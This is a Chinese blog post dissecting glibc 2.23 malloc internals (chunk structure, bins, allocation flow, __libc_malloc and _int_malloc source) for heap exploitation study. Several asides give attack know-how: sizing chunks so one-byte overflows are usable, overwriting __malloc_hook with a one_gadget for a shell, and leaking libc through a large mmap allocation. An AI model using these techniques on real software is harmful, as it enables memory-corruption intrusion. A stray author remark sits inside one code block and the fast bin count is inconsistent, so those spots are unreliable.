class="meta-keyword">define</span> chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br></pre></td></tr></table></figure><p>那么就可以看到<code>chunksize</code>在取实际<code>size</code>的时候与了一个<code>0xfffffff8</code>，忽略了最低三位，64位操作系统则会忽略最低四位。</p><p>以下例子为64位操作系统</p><p><code>chunk</code>最小的大小为<code>0x20</code>，为什么没有<code>0x10</code>大小的<code>chunk</code>呢，这么看来<code>size</code>占了<code>8</code>字节还能有8字节给用户去写似乎没问题。大不了我超过<code>8B</code>再分配<code>0x20</code>大小的内存嘛，这个疑问先放一下，我们来看看这样的策略它还有没有什么问题。</p><p>如果一个<code>chunk</code>被确定释放了，那么该以什么方式去管理。你会想到前面有一个<code>prev_inuse</code>位可以确定一个堆块是否被释放，你会想到改下一个<code>chunk</code>的标志位就可以了，但是如果这个内存块再次被需要呢，难道去遍历每一个<code>chunk</code>，一来要看<code>size</code>符不符合，二来还要看它有没有被使用，这样时间开销太大了。因为空闲的<code>chunk</code>可能散落在内存各个角落，管理零碎内存最好的办法就是链表。链表还得有表头，这个表头其实就是我们的<code>main_arena</code>中的<code>bin</code>。因此<code>chunk</code>上还得有一块内存是指针，指针又占了<code>8</code>个字节。</p><p>但是你可能想到，指针它只在块被释放的时候有用啊，<code>0x10</code>的块，一个<code>size</code>，一个指针，被分配的时候用指针作为数据域，被释放的时候指针用于链式管理。这样就解决了，这样也的确没问题。但是看看它这样的分配策略还有没有问题？如果我多次分配<code>chunk</code>很小的块，<code>free</code>之后它们便只能用于分配这么大的内存了。如果不加另一种策略组织起来，导致内存碎片越来越多，就容易耗尽系统内存。</p><p>那么就有<code>ptmalloc</code>的又一个策略：尽量合并物理相邻的<code>free_chunk</code>。咱们前面一直提到切割内存块，合并内存块就是切割的一个逆过程。在合并的时候我可能前面会有<code>free</code>的内存块，后面也会有<code>free</code>的内存块。那么我怎么在只知道我自身信息的情况下准确找到前后的<code>chunk</code>具体在哪呢。</p><p>想找到后面的很容易，我知道我自己所在的位置（指针），也知道我的<code>size</code>，那么相加就可以找到后面的<code>size</code>了。那么我如何找前面的<code>size</code>在什么位置呢？所以就不得不再开辟一个内存来存前一个<code>chunk</code>的信息了。通过<code>prev_inuse</code>位我很容易得知前一个<code>chunk</code>有没有被<code>free</code>，但是我并不知道前一个<code>chunk</code>的大小啊。所以在一个<code>chunk</code>的结构体，在size之前还会有一个<code>prev_size</code>。与前面那个指针同理，我只有在前一个块被<code>free</code>需要合并的时候才会想看看它在哪，他要是都还在用我都没必要去使用这个<code>prev_size</code>字段了。但是要注意，这个<code>prev_size</code>是服务于上一个<code>chunk</code>的。所以一个chunk的结构体就有<code>0x10</code>个不得不分配的字节，而且自己还不能用。因此<code>0x10</code>的<code>chunk</code>就没有意义了。所以源码中也会找到这样的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE 4*SIZE_SZ</span></span><br></pre></td></tr></table></figure><p>说了这么多了，<code>ptmalloc</code>的策略大致总结一下就是：</p><ol><li><p>一次系统调用会分配大块内存</p></li><li><p>程序结束后统一归还内存给操作系统</p></li><li><p>方便管理，内存分配尽量对齐，也就是所谓的size为某某整倍数</p></li><li><p>尽量分配最小能满足的内存块</p></li><li><p>链式管理空闲空间，适当的时候合并物理相邻的<code>chunk</code></p></li></ol><p>而且根据以上分析我们可以得出一些关于<code>chunk</code>的结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> prev_size;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    chunk *fd;</span><br><span class="line">    chunk *bk;<span class="comment">//因为链式管理还有可能是双向链表</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，我们大致就明白了<code>ptmalloc</code>的分配方式。</p><h2 id="ptmalloc2的具体分配策略"><a href="#ptmalloc2的具体分配策略" class="headerlink" title="ptmalloc2的具体分配策略"></a>ptmalloc2的具体分配策略</h2><p>前面我们讲到了，对于空闲块使用了链式管理方式。但是对于不同大小的<code>chunk</code>，它又有细分。这里先给一个概念：<code>bin</code>，字面意义垃圾桶，用于装<code>free_chunk</code>的垃圾桶，在这里可以理解为链表表头。</p><p>以下均以<code>glibc 2.23</code>版本解析</p><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>对于<code>size</code>较小的<code>free_chunk</code>，我们认为它很快就会被再次用到，因此在<code>free</code> <code>0x20~0x80</code>大小的<code>chunk</code>时，我们会把它扔进<code>fast bin</code>里面，字面意义，里面存的<code>free_chunk</code>很快会被再次用到。<code>fast bin</code> 管理<code>free_chunk</code>采用单链表方式，并且符合后进先出（<code>FILO</code>）的原则，比如以下程序段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">y=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">free</span>(x);</span><br><span class="line"><span class="built_in">free</span>(y);</span><br><span class="line">z=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">w=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br></pre></td></tr></table></figure><p>那么z会得到y的指针，w会得到x的指针。</p><p>并且<code>fast bin</code>的<code>chunk</code>的之后的<code>chunk</code> <code>prev_inuse</code>位永远为1。也就是说它永远被视为在使用中，但是通常这个使用中是用于检测参不参与物理相邻<code>chunk</code>的合并，所以不会参与物理相邻的<code>chunk</code>的合并，也不会被切割。它的匹配规则就是，定量匹配。比如我想要一个<code>0x30</code>的<code>chunk</code>，没有就是没有，没有我就找其它的，不会说<code>0x40</code>好像还挺合适就拿了，不会。</p><p><code>fast bin</code>一共有<code>10</code>个，<code>main_arena</code>结构体中，用<code>fastbinsY</code>来存储每一个<code>fast bin</code>的链表头部，32位系统中，<code>fast bin</code>，从0x10开始到<code>0x40</code>，有7种<code>fast bin</code>，64位系统从<code>0x20</code>开始到<code>0x80</code>，也是七种<code>fast bin</code>。单个<code>fast bin</code>链表上的<code>chunk</code>大小一定严格相等。</p><p>一定情况下可以修改<code>global_max_fast</code>的值来调整<code>fast bin</code>的个数，64位系统下这个值通常为<code>0x80</code>，代表小于等于<code>0x80</code>的<code>chunk</code>都为<code>fast bin</code>。</p><p>其余的链表头部都在<code>bin</code>数组当中。并且由于只有<code>fast bin</code>是单链表结构，其余<code>bin</code>都是双向链表结构，<code>bin</code>会成对出现。</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>对于非<code>fast bin</code>大小的<code>chunk</code>，被释放时会首先进入<code>unsorted bin</code>。<code>unsorted bin</code>在特定的时候会进入<code>small bin</code> 和 <code>large bin</code>。</p><p>非<code>fast bin</code>的<code>bin</code>都是用一对<code>bin</code>指针来描述的，这两个<code>bins</code>也要看成一个<code>chunk</code>，然后初始它们的<code>fd</code>和<code>bk</code>都指向自身的<code>prev_size</code>那个位置。比如<code>main_arena+104</code>这个地方是<code>bin</code>数组的第一个，然后呢<code>main_arena+104</code>和<code>main_arena+112</code>分别就是<code>unsorted bin</code>的头部，它们本身虽然不是<code>chunk</code>，但是要理解它们的初始状态还是得看成一个<code>chunk</code>。所以<code>main_arena+104</code>和<code>main_arena+112</code>的初始值就是<code>main_arena+88</code>。如图：</p><p><img src="/2022/01/27/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1.png" alt="1"></p><p>设置这一个<code>bin</code>的主要目的是扮演一个缓存层的角色以加快分配和释放的操作，链表中<code>chunk</code>大小不一定相等且无序排列。</p><p>当需要检查<code>unsorted bin</code>的时候，会遍历整个链表，寻找第一个能满足的<code>chunk</code>大小切割。如果切割后的大小不足<code>2*SIZE_SZ</code>，则不会切割，而是将整个堆块返回给用户使用。</p><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><p>一共有<code>62</code>个，从最小的<code>chunk</code>开始，公差为<code>SIZE_SZ*2</code>，双链表管理。它的特点也是跟fast bin一样，单条链表<code>chunk</code>大小相等，但是它会参与合并，切割。先进先出（<code>FIFO</code>）的策略。它表示的范围就是<code>4*SIZE_SZ~126*SIZE_SZ</code></p><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><p><code>large bin</code>与<code>small bin</code>不一样，<code>large bin</code>表示的是一个范围。一共有<code>63</code>个(假设下标<code>0~62</code>)，从<code>small bin</code>最小不能表示的<code>chunk</code>开始，大到无穷。</p><p>它表示的范围类似一个等差数列。</p><table><thead><tr><th>起下标</th><th>止下标</th><th>公差</th></tr></thead><tbody><tr><td>0</td><td>31</td><td>16*SIZE_SZ</td></tr><tr><td>32</td><td>47</td><td>32*SIZE_SZ</td></tr><tr><td>48</td><td>55</td><td>64*SIZE_SZ</td></tr><tr><td>56</td><td>59</td><td>128*SIZE_SZ</td></tr><tr><td>60</td><td>61</td><td>256*SIZE_SZ</td></tr><tr><td>62</td><td>62</td><td>∞</td></tr></tbody></table><p>最小的<code>large bin</code>是<code>small bin</code>的最小不能表示的大小。</p><p>所以<code>large bin</code>从<code>128*SIZE_SZ</code>开始。那么下标为<code>0</code>的<code>large bin</code>表示的范围就是<code>128*SIZE_SZ~144*SIZE_SZ</code>(左闭右开)，同理下标为1的<code>large bin</code>表示的范围就是<code>144*SIZE_SZ~160*SIZE_SZ</code>，以此类推，等到<code>32</code>的时候就在原来的基础上加<code>32*SIZE_SZ</code>作为右开区间</p><p>它会以二维双向链表进行维护，对于<code>bin</code>中所有的<code>chunk</code>，相同大小的<code>chunk</code>用<code>fd</code>和<code>bk</code>指针相连，对于不同大小的<code>chunk</code>，采用<code>fd_nextsize</code>和<code>bk_nextsize</code>指针连接。并且沿着<code>fd_nextsize</code>指针，<code>chunk</code>大小递增。</p><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top_chunk"></a>top_chunk</h3><p>我们之前说过，第一次<code>malloc</code>的时候，操作系统会给我们<code>0x21000B</code>的内存，它是作为一个<code>top_chunk</code>存在的，可以把<code>top_chunk</code>看成<code>heap</code>的边界。<code>top_chunk</code>的地址会被记录在main_arena+88的位置。<code>gdb</code>中通过<code>p/x main_arena</code>的命令也可以查看<code>main_arena</code> 的具体结构。</p><h3 id="分配流程"><a href="#分配流程" class="headerlink" title="分配流程"></a>分配流程</h3><p>首先用户<code>malloc</code>请求一个内存，先将请求的内存大小转换成<code>chunk</code>的大小，通过以下宏定义转换。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br></pre></td></tr></table></figure><p>大概逻辑就是寻找一个最小能满足的<code>chunksize</code>作为<code>chunk</code>大小。</p><p>什么是最小能满足呢，我们看看一个<code>size=0x20</code>的<code>chunk</code>能有多少区域给用户写：<code>0x20</code>字节分别为<code>prev_size</code>，<code>size</code>，<code>fd</code>和<code>bk</code>，<code>prev_size</code>和<code>size</code>都不允许写，但是我们可以写<code>fd</code>和<code>bk</code>，以及下一个块的<code>prev_size</code>，前面我们也说过，当这个块没有被<code>free</code>的时候，它的<code>fd</code>,<code>bk</code>以及下一个<code>chunk</code>的<code>prevsize</code>位都是可以给用户任意写数据的，所以<code>size=0x20</code>，我们可以写的数据段为<code>0x18</code>。最小能满足就是说，当我请求的内存小于等于<code>0x18</code>的时候，我给你<code>size=0x20</code>的<code>chunk</code>，一旦多了就继续加<code>0x10</code>，也就是<code>2*SIZE_SZ</code>。这里用了其它宏定义去描述它我们尚且不管，如果用一个函数来实现它的话大概就是这样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">request2size</span><span class="params">(<span class="keyword">size_t</span> req)</span></span>&#123;</span><br><span class="line">    chunk_size=SIZE_SZ*<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">while</span>(chunk_size&lt;req)chunk_size+=<span class="number">2</span>*SIZE_SZ;</span><br><span class="line">    <span class="keyword">return</span> chunk_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以在分配的时候我们尽量选择<code>0x18</code>,<code>0x28</code>这样刚刚好的数值，这样更容易发生溢出，哪怕溢出一个字节，也能够加以利用。</p><p>那么算出了它的<code>chunk_size</code>之后呢，我们先会判断这个<code>chunk_size</code>是否<code>&lt;=global_max_fast</code>，也就是是否在<code>fast bin</code>范围内。如果在则优先寻找能匹配的<code>fast bin</code>，如果该<code>size</code>的<code>fast bin</code>为空则会寻找<code>small bin</code>，<code>small bin</code>会寻找特定<code>size</code>的<code>chunk</code>返回。如果<code>small bin</code>也为空，或者找不到能满足的那就会去<code>large bin</code>中寻找，同样是最小能满足，找到之后返回或者切割之后返回。还找不到就会去<code>unsorted bin</code>，<code>unsorted bin</code>则会找第一个能满足的<code>chunk</code>并返回或者切割之后返回，<code>unsorted bin</code> 中每遍历一个不满足要求的<code>unsorted bin</code>就会把该<code>unsorted bin</code>加到合适的small bin或者<code>large bin</code>当中。如果切割之后剩余的部分&lt;<code>MINSIZE</code>，那么则不会切割整个返回。</p><p>如果还是找不到，那么就会切割<code>top_chunk</code>。如果<code>top_chunk</code>都不能满足请求的大小，则会<code>free</code> <code>top_chunk</code>并再一次向操作系统申请新的<code>top_chunk</code>，这次申请同样还是申请一个<code>0x21000B</code>的<code>top_chunk</code>，通常情况下旧的<code>top_chunk</code>和新申请的<code>top_chunk</code>物理相邻，那么如果<code>free</code> 旧的<code>top_chunk</code>进入了一个非<code>fast bin</code>的链当中，就会被新的<code>top_chunk</code>合并。</p><p>如果一次申请的内存超过<code>0x200000B</code>，那么就不会在heap段上分配内存，将会使用<code>mmap</code>在<code>libc</code>的<code>data</code>段分配内存。通常利用就是每次分配给分配地址，分配<code>size</code>没限制那就<code>malloc</code>一个很大的内存就可以直接泄露<code>libc</code>的地址。</p><p>分配方式到此就讲完了。</p><h2 id="malloc源码分析"><a href="#malloc源码分析" class="headerlink" title="malloc源码分析"></a>malloc源码分析</h2><p>接下来我们直接解读一下<code>malloc</code>的源码。</p><h3 id="libc-malloc源码分析"><a href="#libc-malloc源码分析" class="headerlink" title="__libc_malloc源码分析"></a>__libc_malloc源码分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*------------------------ Public wrappers. --------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc实际上会直接调用这里的<code>__libc_malloc</code>函数，然后<code>__libc_malloc</code>也只不过是一层包装而已，实际上大部分的逻辑都是调用<code>_int_malloc</code>函数完成的，那么先来分析外面。</p><p>第一段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>定义了一个<code>hook</code>函数指针，如果<code>hook!=NULL</code>则直接调用<code>hook</code>指向的内容。<code>hook</code>是为了方便开发者调试的一个东西，比如我自己写了一个<code>malloc</code>函数想测试它的性能如何，那么我在这里直接让<code>__malloc_hook=my_malloc</code>就可以直接调用我自己写的malloc函数了。但是同时它也是最容易被劫持的，刚开始我们很多题目都是靠写<code>__malloc_hook</code>为一个<code>onegadget</code>，然后调用<code>malloc</code>去<code>getshell</code>的。在<code>2.34</code>版本中，<code>__malloc_hook</code>同其它大部分的<code>hook</code>都被删除了。</p><p>第二段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arena_get (ar_ptr, bytes);</span><br><span class="line">victim = _int_malloc (ar_ptr, bytes);</span><br></pre></td></tr></table></figure><p>通过<code>arena_get</code>获得一个分配区，<code>arena_get</code>是个宏定义，定义在<code>arena.c</code>中，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line"><span class="meta">      arena_lookup (ptr);                           \</span></span><br><span class="line"><span class="meta">      arena_lock (ptr, size);                         \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p><code>arena_lookup</code>定义如下，也是获取分配器指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_lookup(ptr) do &#123; \</span></span><br><span class="line"><span class="meta">      void *vptr = NULL;                              \</span></span><br><span class="line"><span class="meta">      ptr = (mstate) tsd_getspecific (arena_key, vptr);             \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>然后加锁，没了，获取分配器指针这一段不是我们主要要分析的，也就不过多去解析了。</p><p>第三段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">      (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br></pre></td></tr></table></figure><p>它本身注释也写清楚了，在能够找到一个可用的<code>arena</code>之前尝试寻找另外一个<code>arena</code>，我这英文比较飘还请亲见谅。如果<code>arena</code>找到了但是<code>_int_malloc</code>居然返回0了，那么就重新寻找另一个分配器再次调用一次<code>_int_malloc</code>。完了之后呢，要给<code>arena</code>解锁，然后返回得到的<code>chunk</code>指针。</p><h3 id="int-malloc源码分析"><a href="#int-malloc源码分析" class="headerlink" title="_int_malloc源码分析"></a>_int_malloc源码分析</h3><p>由于比较长，为了摆脱水长度的嫌疑就不给看总代码了，需要的自己找<code>glibc</code>的源码就好了，下面我一段一段分析。</p><h3 id="第一段：main-arena初始化"><a href="#第一段：main-arena初始化" class="headerlink" title="第一段：main_arena初始化"></a>第一段：main_arena初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line"><span class="keyword">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *errstr = <span class="literal">NULL</span>;  </span><br><span class="line">checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">void</span> *p = sysmalloc (nb, av);<span class="built_in">free</span>的源码分析先咕一会，主要是吧，熬夜写这玩意受不了。。</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变量定义就不用看了，源码中也都标注出来了，这里最主要就是把用户请求的<code>bytes</code>转换成最小能满足的<code>chunk size</code>，然后它的变量名应该是<code>nb</code>，这个<code>nb</code>应该是<code>nbytes</code>的缩写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> checked_request2size(req, sz)                             \</span></span><br><span class="line"><span class="meta">  <span class="meta-keyword">if</span> (REQUEST_OUT_OF_RANGE (req)) &#123;                          \</span></span><br><span class="line"><span class="meta">      __set_errno (ENOMEM);                              \</span></span><br><span class="line"><span class="meta">      return 0;                                      \</span></span><br><span class="line"><span class="meta">    &#125;                                          \</span></span><br><span class="line"><span class="meta">  (sz) = request2size (req);</span></span><br></pre></td></tr></table></figure><p>这里原来也给注释了，这俩宏定义就是一样的，只不过做一个参数check。</p><p>这里还要注意一下那些宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__glibc_unlikely(<span class="built_in">exp</span>)表示<span class="built_in">exp</span>很可能为假。</span><br><span class="line">__glibc_likely(<span class="built_in">exp</span>)表示<span class="built_in">exp</span>很可能为真。</span><br><span class="line">__builtin_expect(<span class="built_in">exp</span>,value)表示<span class="built_in">exp</span>==value大概率成立</span><br></pre></td></tr></table></figure><p>这三个宏定义在源码中经常能看到，其实它不会改编程序逻辑，只是告诉编译器这个很可能为某个值，就把否的情况作为跳转，真的情况就顺序运行下去，减少程序的跳转，一定程度上可以优化程序运行速度。或者还有一个简单粗暴的办法，你把这三个字符全都去了，不影响代码逻辑。</p><p>那么这一段的逻辑就是，如果在分配的时候<code>arena</code>为空，那就调用<code>sys_malloc</code>系统调用去请求一个<code>chunk</code>，然后<code>memset</code>这个<code>chunk</code>的数据段。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ------------------ Testing support ----------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> perturb_byte;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">alloc_perturb</span> <span class="params">(<span class="keyword">char</span> *p, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (perturb_byte))</span><br><span class="line">    <span class="built_in">memset</span> (p, perturb_byte ^ <span class="number">0xff</span>, n);</span><br><span 